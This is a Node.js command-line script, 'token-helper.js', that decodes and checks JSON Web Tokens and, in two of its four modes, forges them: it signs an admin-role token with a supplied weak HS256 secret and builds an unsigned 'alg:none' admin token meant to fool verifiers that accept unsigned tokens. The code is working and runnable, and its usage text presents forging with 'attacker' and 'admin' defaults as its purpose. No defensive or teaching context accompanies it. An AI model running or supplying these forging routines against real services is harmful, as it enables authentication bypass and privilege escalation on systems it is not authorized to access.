const jwt = require('jsonwebtoken');

function usage() {
  console.log(`
token-helper.js — tools for inspecting and forging JWTs

Usage:
  node token-helper.js --decode <token>
  node token-helper.js --check <token>
  node token-helper.js --forge-hs256 <secret> [--role <role>] [--sub <sub>] [--exp <seconds>]
  node token-helper.js --forge-alg-none [--payload '{"sub":"attacker","role":"admin"}'] [--exp <seconds>]

Examples:
  node token-helper.js --decode eyJ...
  node token-helper.js --check eyJ...
  node token-helper.js --forge-hs256 weak-secret --role admin --exp 3600
  node token-helper.js --forge-alg-none --payload '{"sub":"attacker","role":"admin"}' --exp 3600
`);
}

function parseArgs() {
  const args = {};
  const raw = process.argv.slice(2);
  for (let i = 0; i < raw.length; i++) {
    const a = raw[i];
    if (a.startsWith('--')) {
      const key = a.slice(2);
      const val = raw[i+1];
      if (!val || val.startsWith('--')) {
        args[key] = true;
      } else {
        args[key] = val;
        i++;
      }
    }
  }
  return args;
}

function base64urlEncode(obj) {
  return Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}

(async () => {
  const argv = parseArgs();
  if (Object.keys(argv).length === 0) {
    usage();
    process.exit(0);
  }

  if (argv.decode) {
    const token = argv.decode;
    const decoded = jwt.decode(token, { complete: true });
    console.log('=== DECODE (no verification) ===');
    console.log(JSON.stringify(decoded, null, 2));
    process.exit(0);
  }

  if (argv.check) {
    const token = argv.check;
    const decoded = jwt.decode(token, { complete: true });
    if (!decoded) {
      console.error('Invalid token (cannot decode).');
      process.exit(1);
    }
    console.log('=== HEADER ===');
    console.log(JSON.stringify(decoded.header, null, 2));
    console.log('=== PAYLOAD ===');
    console.log(JSON.stringify(decoded.payload, null, 2));
    const now = Math.floor(Date.now()/1000);
    console.log('current_unix:', now);
    if (decoded.payload && decoded.payload.exp) {
      console.log('token exp:', decoded.payload.exp, `(in ${decoded.payload.exp - now} seconds)`);
      if (now >= decoded.payload.exp) {
        console.log('>>> Token is EXPIRED');
      } else {
        console.log('>>> Token is NOT expired');
      }
    } else {
      console.log('No exp claim present in token.');
    }
    process.exit(0);
  }

  if (argv['forge-hs256']) {
    const secret = argv['forge-hs256'];
    const role = argv.role || 'admin';
    const sub = argv.sub || 'attacker';
    const expSeconds = parseInt(argv.exp || '3600', 10);
    const payload = { sub, role };
    const token = jwt.sign(payload, secret, { algorithm: 'HS256', expiresIn: expSeconds });
    console.log('=== FORGED HS256 TOKEN ===');
    console.log(token);
    process.exit(0);
  }

  if (argv['forge-alg-none']) {
    const payloadArg = argv.payload || '{"sub":"attacker","role":"admin"}';
    let payload;
    try {
      payload = JSON.parse(payloadArg);
    } catch (e) {
      console.error('Invalid JSON in --payload');
      process.exit(1);
    }
    const expSeconds = argv.exp ? parseInt(argv.exp, 10) : null;
    if (expSeconds) {
      payload.exp = Math.floor(Date.now()/1000) + expSeconds;
      payload.iat = Math.floor(Date.now()/1000);
    } else {
      payload.iat = Math.floor(Date.now()/1000);
    }
    const header = { alg: 'none', typ: 'JWT' };
    const token = base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
    console.log('=== FORGED alg:none TOKEN ===');
    console.log(token);
    process.exit(0);
  }

  console.error('No recognized action. See usage:');
  usage();
  process.exit(1);
})();
